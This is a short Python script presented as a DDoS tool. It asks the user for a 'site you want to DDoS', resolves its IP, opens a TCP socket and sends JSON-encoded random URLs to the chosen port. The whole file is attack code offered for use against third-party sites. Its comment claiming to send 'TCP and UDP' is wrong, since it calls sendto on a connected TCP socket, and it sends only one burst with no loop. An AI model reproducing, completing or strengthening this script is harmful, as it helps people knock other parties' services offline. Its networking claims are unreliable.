from helpers import get_random_url
import json
import socket


def attack_worker(ip_address, port):
    try:
        # Creating and connecting with socket
        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ddos.connect((ip_address, port))

        # Creating random url to send message
        random_url = get_random_url()
        message = json.dumps(random_url).encode()

        # Sending TCP and UDP message
        ddos.send(message)
        ddos.sendto(message, (ip_address, port))
        ddos.send(message)

        # Socket Closing
        ddos.close()

    except Exception as err:
        print(err)


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    # Getiing IP address
    ip_address = socket.gethostbyname(host)

    print("|| DDoS Loaded ||")

    # Call attack_worker function
    attack_worker(ip_address, port)


if __name__ == "__main__":
    main()
